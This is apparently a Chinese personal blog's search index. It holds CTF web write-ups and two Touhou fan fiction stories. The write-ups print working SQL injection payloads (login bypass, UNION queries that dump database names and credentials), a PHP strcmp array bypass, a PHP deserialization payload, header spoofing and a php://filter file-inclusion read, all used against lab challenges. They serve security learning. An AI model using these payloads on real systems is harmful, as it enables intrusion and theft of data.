<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>LoveSQL</title>
      <link href="/qiuyu.github.io/2022/01/16/lovesql/"/>
      <url>/qiuyu.github.io/2022/01/16/lovesql/</url>
      
        <content type="html"><![CDATA[<h3 id="第一步、用万能密码测试"><a href="#第一步、用万能密码测试" class="headerlink" title="第一步、用万能密码测试"></a>第一步、用万能密码测试</h3><p>面对sql题，第一步先试试万能密码，反正也没什么事。</p><p><strong>0’ or 1=1 #</strong></p><p>然后得到个这个</p><p><img src="/qiuyu.github.io/qiuyu.github/image-20210920160404745.png" alt="image-20210920160404745"></p><p>虽然不知道是什么东西，但是可以登陆成功说明是有漏洞的。</p><h3 id="第二步、查字段数量"><a href="#第二步、查字段数量" class="headerlink" title="第二步、查字段数量"></a>第二步、查字段数量</h3><p>然后开始查字段的数量吧，只有知道字段的数量，才能用联合查询。</p><p><strong>0’ order by x #</strong> （x为数字，根据回显判断字段数量）</p><p>先试了试0’ order by 2 # 然后没有问题，3也没有问题。到4的时候变成了</p><p><img src="/qiuyu.github.io/qiuyu.github/image-20210920161236927.png" alt="image-20210920161236927"></p><p>说明只有三个字段。</p><h3 id="第三步、爆库名"><a href="#第三步、爆库名" class="headerlink" title="第三步、爆库名"></a>第三步、爆库名</h3><p>用联合查询的时候，select后要跟三个内容，分别对应三个字段。</p><p>格式为：0’ union select 1,1,group_concat(table_schema) from information_schema.tables #</p><p>在这三个内容里面，只有最后一个查询table_schema才是我们想要的。table_schema就是库名。group_concat()可以把多条数据用逗号连接起来，作为一条数据输出。</p><p>而这个information_schema库中就包含了所有的信息</p><p>但需要注意的是，这样输出会输出很多名称重复的数据，我们可以用在table_schema前面加个distinct来消除重复行。完整语句是：</p><p><strong>0’ union select 1,1,group_concat(distinct table_schema) from information_schema.tables #</strong></p><p>得到下面的结果</p><p><img src="/qiuyu.github.io/qiuyu.github/image-20210920160327350.png" alt="image-20210920160327350"></p><p>应该是在geek库</p><h3 id="第四步、爆表名"><a href="#第四步、爆表名" class="headerlink" title="第四步、爆表名"></a>第四步、爆表名</h3><p><strong>‘ union select 1,1,group_concat(distinct table_name) from information_schema.tables where table_schema=database() #</strong></p><p>得到表名geekuser和l0ve1ysq1</p><p><img src="/qiuyu.github.io/qiuyu.github/image-20210920165434936.png" alt="image-20210920165434936"></p><h3 id="第五步、爆列名"><a href="#第五步、爆列名" class="headerlink" title="第五步、爆列名"></a>第五步、爆列名</h3><p><strong>0’ union select 1,1,group_concat(distinct column_name) from information_schema.columns where table_name=’l0ve1ysq1’ #</strong></p><p><img src="/qiuyu.github.io/qiuyu.github/image-20210920165601070.png" alt="image-20210920165601070"></p><h3 id="第六步、爆数据"><a href="#第六步、爆数据" class="headerlink" title="第六步、爆数据"></a>第六步、爆数据</h3><p><strong>0’ union select 1,1,group_concat(id,username,password) from geek.l0ve1ysq1 #</strong></p><p>得到flag</p><p><img src="/qiuyu.github.io/qiuyu.github/image-20210920170821001.png" alt="image-20210920170821001"></p><p><img src="/qiuyu.github.io/qiuyu.github/image-20210920170847727.png" alt="image-20210920170847727"></p>]]></content>
      
      
      <categories>
          
          <category> web wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红魔馆的夜晚</title>
      <link href="/qiuyu.github.io/2021/10/16/hong-mo-guan-de-ye-wan/"/>
      <url>/qiuyu.github.io/2021/10/16/hong-mo-guan-de-ye-wan/</url>
      
        <content type="html"><![CDATA[<p>（多年前的外界，同样是一个静谧的夜晚）</p><p>  “这个交易，如何？”身穿紫色洋装的少女将手中的茶杯放下，缓缓地看向蕾米莉亚，微笑着说道。</p><p>  “八云紫，你们妖怪贤者都这么狂妄的么？”蕾米莉亚傲慢地看向八云紫，“高贵的吸血鬼是不会为了一处住所而去屈身帮你们的。”</p><p>  “只是各取所需而已嘛，”紫仍然慢条斯理地说道，“这样的结果对我们双方都有利哦。”</p><p>  “况且，你们也没有其它选择了吧。”八云紫用折扇挡住面部，眼睛直直地盯着蕾米莉亚。眼中虽仍有笑容，却已透出阵阵寒意。</p><p>  “呵！说白了是在威胁我罢了。”蕾米身后的翅膀渐渐张开，深红色的双眼毫无生机地看向八云紫。</p><p>  空气如同凝固一般，四周一片寂静…</p><p>  八云紫将折扇收起，叹了口气，平静地看向窗外：“只要能将目的达到，你用什么方法都是可以的哦。”</p><p>  “这段历史会被记载为‘吸血鬼入侵幻想乡，在最后时刻，妖怪贤者们击退了吸血鬼，并签署了契约。’没人会知道今天这场交易的。”紫似乎对更改历史的记录很有信心。</p><p>  “那，为什么找上我？”蕾米的翅膀缓缓收起，似乎对这件事产生了兴趣。</p><p>  “啊啦啊啦，”紫笑了笑，“安于现状，不愿改变。这一点，不论是人还是妖怪，果然还是一样的呢。不过，这种安逸的现状会毁了幻想乡的妖怪们也说不一定哦。虽然推行新的规则能够改变这一点，但是推进过程中还是有不少阻力呢。”</p><p>  “就是那个’符卡规则‘啊，相当无聊且华而不实呢。”蕾米并不满意这个答案。</p><p>  “在幻想乡，不需要拼个你死我活哦，华丽才是最重要的。”紫认真的回答道。</p><p>  蕾米心想：不需要你死我活么。</p><p>  “吸血鬼在妖怪中具有最高级别的魅力，由你们牵头使用符卡规则，想必会有不少妖怪追随，这样一来，推进过程就会快很多。”紫看向沉思中的蕾米。</p><p>  忽然，蕾米睁开眼睛，轻蔑地看向八云紫：“你就不怕——我真的占领幻想乡？”突然间，一层薄薄的红雾从房间四周向中间聚集，将八云紫包围住。红雾如同一双无形的手，缓缓伸向八云紫的咽喉。</p><p>  这时，八云紫忽然从房间中消失了。下一秒，紫出现在了蕾米身后。</p><p>  “是隙间！”蕾米心想。</p><p>  蕾米莉亚正准备站起来，八云紫的手就放在了蕾米肩上。“这就要看你的实力了。希望不会让我失望。”紫冷冷地说道。</p><p>  随后，紫将放在蕾米肩上的手放开，又恢复成了平时漫不经心的状态：“嘛，你先考虑一下吧。”随后，便又从房间中消失了。</p><p>  房间又回归了静谧。蕾米静静地看着桌子上的红茶… …</p>]]></content>
      
      
      <categories>
          
          <category> 小说 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 东方同人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>夜幕中的星火</title>
      <link href="/qiuyu.github.io/2021/10/04/ye-mu-zhong-de-xing-huo/"/>
      <url>/qiuyu.github.io/2021/10/04/ye-mu-zhong-de-xing-huo/</url>
      
        <content type="html"><![CDATA[<h3 id="序章"><a href="#序章" class="headerlink" title="序章"></a>序章</h3><p>太阳缓缓落下，夜幕逐渐笼罩了整座大山。星光微暗，凉风渐起，更添萧瑟氛围。只有蝉的叫声为这个场景增添了一点声响。在山顶的一处空地上，有一个女孩静静的坐在一个土堆旁边，一言不发，呆呆地看着天空。这里出奇的安静，似乎时间也凝滞住了。</p><p>村长死了，就埋在山顶。</p><p>宫疏晓不知道死了究竟是怎么回事。她只知道，这就意味着她再也不能扑入村长爷爷的怀抱里，再也看不到村长爷爷慈祥的微笑，在她受到欺负的时候，再也没有人替她说活了。“死”从她的身边夺走了她亲爱的村长爷爷。</p><p>比起难过，伤心，宫疏晓心里更多的是感到迷茫和害怕。这已经不是第一次“死”从她身边夺走亲人了。从她一出生，“死”就夺走了她的妈妈。在她记事之前，“死”又夺走了她的爸爸。她从小就在村长爷爷的照看下长大。曾经，她不止一次的去问村长爷爷，为什么“死”要从自己身边夺走爸爸妈妈，自己就再也见不到他们了吗…</p><p>曾经，每当这时，村长爷爷就会停下手里的工作，将宫疏晓搂在怀里，安慰她说道：”你的爸爸妈妈只是去了另一个世界，虽然你看不到他们，但他们仍然在默默注视着你，为你祝福呢。“</p><p>”可是，我听村里的人说，都是因为我出生在一个最不吉利的日子，才会导致爸爸妈妈的死亡。我就是那个最不幸，被神明厌恶的女孩。“宫疏晓想起村中人们看到自己时，厌恶的神情，不由地害怕的身体发抖。</p><p>”别听他们瞎说，死亡只是人生最终要经历的一件事罢了。你可是我们村子里的现任巫女，是神明的代言人，怎么会被神明厌恶呢。“村长安抚着宫疏晓。</p><p>”可是…我，我想爸爸妈妈了。“宫疏晓渐渐哭了出来。</p><p>“哎，”村长爷爷摸了摸宫疏晓的头发，“疏晓啊，人死是不能复生的。你只能慢慢习惯现在的生活，直到这份伤口被时间慢慢愈合。”</p><p>宫疏晓抬起头，泪眼婆娑地看着村长，眼神中充满迷茫。</p><p>“当你想爸爸妈妈的时候，就抬头看看天上的星星吧。这些星星就是你的爸爸妈妈和你连接的通道，在星星的另一头，你的爸爸妈妈也在默默注视着你。”村长轻抚着宫疏晓，默默看着天空。低头时，却发现宫疏晓已经睡着了。</p><p>习惯……么</p><p>曾经，宫疏晓以为自己已经习惯了，习惯没有父母的生活。可现在，村长也走了。她又要花多久才能习惯呢？</p><p>以前的日子里，只要自己遇到困难，向村长爷爷求助就一定能解决。可现在，村长爷爷也离她而去了。就如同在黑夜中，唯一的火把熄灭。在这黑暗之中，悲伤逐渐被迷茫和害怕所侵占。这种恐惧的情感使她胸口发闷，头晕目眩。她怕的想叫出声，可发现喉咙却什么声音都发不出来。只感受到自己在不断地坠落，跌入无底的深渊。</p><p>continue…</p>]]></content>
      
      
      <categories>
          
          <category> 小说 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小说 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大一凌睿招新wp</title>
      <link href="/qiuyu.github.io/2020/10/16/da-yi-ling-rui-zhao-xin-wp/"/>
      <url>/qiuyu.github.io/2020/10/16/da-yi-ling-rui-zhao-xin-wp/</url>
      
        <content type="html"><![CDATA[<h3 id="（1）凌睿第二题"><a href="#（1）凌睿第二题" class="headerlink" title="（1）凌睿第二题"></a>（1）凌睿第二题</h3><p>主要是熟悉一下常见编码，找了个讲述比较全的博客<a href="https://blog.csdn.net/mdxiaohu/article/details/81318643#web%E5%89%8D%E7%AB%AF%E7%AE%80%E4%BB%8B从这里面知道了" target="_blank" rel="noopener">https://blog.csdn.net/mdxiaohu/article/details/81318643#web%E5%89%8D%E7%AB%AF%E7%AE%80%E4%BB%8B从这里面知道了</a><!--注释-->是注释的意思。然后按F12我看到了在正常代码下面有一行注释，注释内容是一串乱码。所以我猜是加密过了。因为我之前知道的加密方式只有base64，所以我先试了试这个。然后就成了。还算简单。</p><h3 id="（2）凌睿第三题"><a href="#（2）凌睿第三题" class="headerlink" title="（2）凌睿第三题"></a>（2）凌睿第三题</h3><p>先下载了burp suite。然后在b站学了基本用法<a href="https://www.bilibili.com/video/BV1T7411m7KG然后就去指定网站抓包。其实就把前几章看了，更多的地方是直接在网上搜博客学怎么用burp" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1T7411m7KG然后就去指定网站抓包。其实就把前几章看了，更多的地方是直接在网上搜博客学怎么用burp</a> suite的。</p><p>首先说这个网站，我最开始是完全懵的。还是先按F12，看代码，然后发现没什么用。于是就感觉好像必须用burp suite才能得到结果。这个过程中，我知道要设置代理服务器，设置完后，还要弄一个协议，才能在开着burp suite的情况下上网。</p><p>bp有两个功能是做这道题需要用到的，一个是proxy要抓包，另一个是repeater，抓过包之后，要把包送到这里，然后改包，send之后看response。</p><p>我最开始的时候，被hint的第一条内容吸引了。http请求头，是我首先去了解的，找了个比较全的<a href="https://blog.csdn.net/qq_42350419/article/details/82841192学完之后，我以为flag在http请求头里，所以我对每一条都认真分析，看flag到底应该藏在哪里。最后我的注意力放到了cookie上，因为感觉这个东西会包含的信息会很多。于是，我就又去查cookie信息包含了什么。还有cookie信息怎么解读。但是找了一天毫无收获。" target="_blank" rel="noopener">https://blog.csdn.net/qq_42350419/article/details/82841192学完之后，我以为flag在http请求头里，所以我对每一条都认真分析，看flag到底应该藏在哪里。最后我的注意力放到了cookie上，因为感觉这个东西会包含的信息会很多。于是，我就又去查cookie信息包含了什么。还有cookie信息怎么解读。但是找了一天毫无收获。</a></p><p>第二天我又这么干，不过这次我把第二天抓到的包的信息与第一天抓的进行对比。发现cookie不一样（惨）然后我突发奇想，我换一个浏览器，抓到的包信息会不会一样。于是我把Google和edge的结果进行对比，然后找到其中相同的地方，那么这些地方就应该是藏flag的地方（在走偏的路上越走越远)</p><p>之后我也看了不少ctf的题和解法，慢慢了解到我之前的想法是不对的。在某一次找题的时候，偶然看到了好像跟Referer有关。我就想到了网站上的那一句话You should come from “<a href="http://www.google.com&quot;" target="_blank" rel="noopener">www.google.com&quot;</a> 之前我一直不理解，然后我突然有想法：这是告诉我，我应该从谷歌来这个网页，于是写了一条：referer:<a href="http://www.google.com然后返回的果然变了。说让我只能在本地看。" target="_blank" rel="noopener">www.google.com然后返回的果然变了。说让我只能在本地看。</a></p><p>我把host改成127.0.0.1，但结果还是不对，然后就又卡了</p><p>直到我又刷到了一个博客<a href="https://blog.csdn.net/weixin_44953600/article/details/107515973?utm_medium=distribute.pc_relevant.none-task-blog-title-2&amp;spm=1001.2101.3001.4242" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44953600/article/details/107515973?utm_medium=distribute.pc_relevant.none-task-blog-title-2&amp;spm=1001.2101.3001.4242</a></p><p>我要是早点找到这个就好了。从这个里面，我知道了我要加一句X-Forwarded-For ：127.0.0.1才算是本地访问。</p><p>然后就给我来了个“你需要用commodo浏览器”我在User-Agent中把浏览器改成了commodo，他就说这个是简称，我应该写全称。又卡了。</p><p>最后，我在谷歌搜索中找到了一个博客，上面写着Commodore 64是全称，我就试了试，最后终于成了。</p><p>真的是太不容易了，主要是最开始的思路走偏了，而且偏的很严重…也是之后看了数不清的有关ctf的博客，才把思路正回来。过程真的是太艰难了….</p><h3 id="（3）凌锐php第一题"><a href="#（3）凌锐php第一题" class="headerlink" title="（3）凌锐php第一题"></a>（3）凌锐php第一题</h3><p>实际上考察了strcmp()漏洞，strcmp比较两个字符串，如果str1小于str2返回&lt;0。如果str1大于str2返回&gt;0。如果相等返回0。因为比较的两者不是同一种类型，所以只会返回0，即结果是比较的两个东西相等。所以，需要绕过验证。绕过的方法是上传的b是一个数组或者一个object即可，但这个只能上传字符串类型，那么，就让b是数组就可以了。在网站后面加一个”?b[]=123”就表示b成了一个数组。然后结果就出来了。（用百度查了两天，没搞懂是怎么回事。用谷歌只用了早读不到半个小时就会了。）</p><p>参考网站：<a href="https://xz.aliyun.com/t/3085" target="_blank" rel="noopener">https://xz.aliyun.com/t/3085</a></p><h3 id="（4）凌锐php第二题"><a href="#（4）凌锐php第二题" class="headerlink" title="（4）凌锐php第二题"></a>（4）凌锐php第二题</h3><p>目前的想法是，flag藏在flag.php中,而__construct()中的命令会让file附上index.php。那么把file设为flag.php,调用__destruct()，并且绕过__construct。应该找到php序化然后用base64编码一下，写到网站后面就行了。但是，我还不知道怎么做。而且好像失败了。</p><p>终于做出来了。</p><p>说一下我的想法，这个是先创建了一个类，Hit。然后这个类里面有两个public变量。还有最重要的是有__construct()和__destruct()。</p><p>__construct是在对象创建时调用此方法。在后面if语句中创建了一个变量str，__construct被调用，file被赋值为”index.php”。flag在flag.php所以要想办法把file赋值改成”flag.php”，得到flag是需要__destruct，因为这个函数会转达process，转到process才有可能输出flag。所以先说如何能用到__destruct。</p><p>__destruct是对象被销毁时执行。而对象被销毁，就要用到反序列化了。那就是if中的unserialize。这里面有一个GET[su29029]所以是要获取su29029的内容。将这个内容赋给变量str。然后在反序列化变量str。</p><p>然后就要说到，到process中之后，应该怎么做。这里面有两个判断。先判断content是不是”Hello World”是的话输出”?”但这个不是我们想要的。我们要这个判断是假，然后进入下一个判断。判断content是不是su29029。是的话，就输出flag。并且注释里说的很明确，flag在flag.php。所以任务就很明确了。</p><p>先创建一个类，命名为Hit，创建两个public变量file和content。file赋值flag.php，content赋值su29029。对这个类序列化得到结果。大致这样：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Hit</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">'su29029'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到结果：O:3:”Hit”:2:{s:4:”file”;s:8:”flag.php”;s:7:”content”;s:7:”su29029”;}</p><p>然后在网页后写上“?su29029=O:3:”Hit”:2:{s:4:”file”;s:8:”flag.php”;s:7:”content”;s:7:”su29029”;}”答案就出来了。</p><p>这道题没有加__wakeup()函数，算是降低难度了，__wakeup()是在反序列化字符串时调用。绕过的方法就是改变对象属性的个数。也就是O:3:”Hit”:<strong>2</strong>:{s:4:”file”;s:8:”flag.php”;s:7:”content”;s:7:”su29029”;}中的”2”改为”3”</p><p>这道题的两个变量是public类型的，使用比较简单。如果是private类的，那么就需要加%00，即%00类的名字%00属性名字 %00Hit%00file</p><h3 id="（5）凌锐Linux题："><a href="#（5）凌锐Linux题：" class="headerlink" title="（5）凌锐Linux题："></a>（5）凌锐Linux题：</h3><p>现在有个想法，因为可能与vim有关，所以可能是关于“备份文件”的。vim会自动保存swp后缀的备份文件。如果下载到源文件，可能能拿到flag。另一个问题是，题目中还提到了一个robot，这可能是robot协议。是跟网页有关的。感觉会和解题有关。</p><p>用御剑扫描一下网站，扫出来了robots.txt。点开网站<a href="http://v8.su29029.xyz:10005/robots.txt" target="_blank" rel="noopener">http://v8.su29029.xyz:10005/robots.txt</a></p><p>发现有</p><pre class="line-numbers language-html"><code class="language-html">User-agent: *Disallow: /fl4g_1s_h3re.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>把 /fl4g_1s_h3re.php放在网站后面，成<a href="http://v8.su29029.xyz:10005/fl4g_1s_h3re.php" target="_blank" rel="noopener">http://v8.su29029.xyz:10005/fl4g_1s_h3re.php</a></p><p>结果网站显示了Can you find out the flag?</p><p>看来还需要一些步骤。</p><p>这一回，我直接在robots.txt后面加/fl4g_1s_h3re.php，结果显示Access denied。<a href="http://v8.su29029.xyz:10005/robots.txt/fl4g_1s_h3re.php" target="_blank" rel="noopener">http://v8.su29029.xyz:10005/robots.txt/fl4g_1s_h3re.php</a></p><p>题目中说“机器人恶意删除了我的vim编辑器”所以我猜这一句话的意思是，vim编辑器意外退出产生临时文件swp。所以我应该找到并下载这个文件。经过不断在网站后面加.swp后缀后，这个文件不知道什么时候就下载下来了。挺突然的…..然后才知道，这个是要在根目录的路径是在10005/后直接加”.index.php.swp”即<a href="http://v8.su29029.xyz:10005/.index.php.swp" target="_blank" rel="noopener">http://v8.su29029.xyz:10005/.index.php.swp</a></p><p>记住swp这类隐藏文件在调用时前面要加一个“.”</p><p>然后就是把这个文件移动到Linux系统里，用vim编辑器，输入“vim -r index.php.wsp”修复这个文件，然后就出现了代码：</p><meta charset="utf8"><?phpecho "Do you like linux and robot?";error_reporting(0);$file = $_GET["file"];if(stristr($file,"php://input") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")){        exit('hacker!');}if($file){        include($file);}?><p>好吧，又该看代码了。这个是文件包含漏洞。通过php函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意代码注入</p><p>这里需要绕过stristr函数，这个东西把好多php伪协议过滤了。</p><p>不过留了一个php://filter没过滤。所以就需要用这个。</p><p>？file=php://filter/read=convert.base64-encode/resource=fl4g_1s_h3re.php</p><p>得到base64编码后的字符串，再用base64解码器解一下，flag就出来了。</p><p>参考网站：<a href="https://blog.csdn.net/qq_42181428/article/details/87090539" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/87090539</a></p><h3 id="（6）凌锐sql注入第一题"><a href="#（6）凌锐sql注入第一题" class="headerlink" title="（6）凌锐sql注入第一题"></a>（6）凌锐sql注入第一题</h3><p>先用万能密码(0’ or 1=1 – )试一下得到了用户名Aione密码er_ci_yuan，显然没什么用…</p><p>第一步：看有多少字段，输一个1’order by 3 – ，显示找不到。输一个“0’ order by 2 – ”，然后显示没问题。所以应该是有两个字段。</p><p>第二步：爆库名<br>‘ union select 1,group_concat(table_schema) from information_schema.tables #<br>得到这个<br>Login success, your flag is flag{<strong><em>*</em></strong>}<br>Your login name is:1<br>Your password is:information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema<br>加一个消除处重复行<br>‘ union select 1,group_concat(<strong>distinct</strong> table_schema) from information_schema.tables #<br>得到<br>Login success, your flag is flag{<strong><em>*</em></strong>}<br>Your login name is:1<br>Your password is:easy_sql,information_schema<br>这个easy_sql应该就包含了flag。库名就是easy_sql</p><p>第三步：表名<br>‘ union select 1,group_concat(distinct table_name) from information_schema.tables where table_schema=’easy_sql’ #<br>‘ union select 1,group_concat(distinct table_name) from information_schema.tables where table_schema=database() #</p><p>上面两种都行</p><p>得到<br>Login success, your flag is flag{<strong><em>*</em></strong>}<br>Your login name is:1<br>Your password is:easy_sql,fl4g<br>表fl4g,sc</p><p>第四步：列<br>‘ union select 1,group_concat(distinct column_name) from information_schema.columns where table_name=’fl4g’ #<br>得到<br>Login success, your flag is flag{<strong><em>*</em></strong>}<br>Your login name is:1<br>Your password is:flag<br>得到列：flag</p><p>第五步：查flag<br>‘union select 1,group_concat(flag) from easy_sql.fl4g #<br>得到<br>Login success, your flag is flag{<strong><em>*</em></strong>}<br>Your login name is:1<br>Your password is:lrstudio{0h_you_ar3_g00d_1t_my5q1i}</p>]]></content>
      
      
      <categories>
          
          <category> web wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
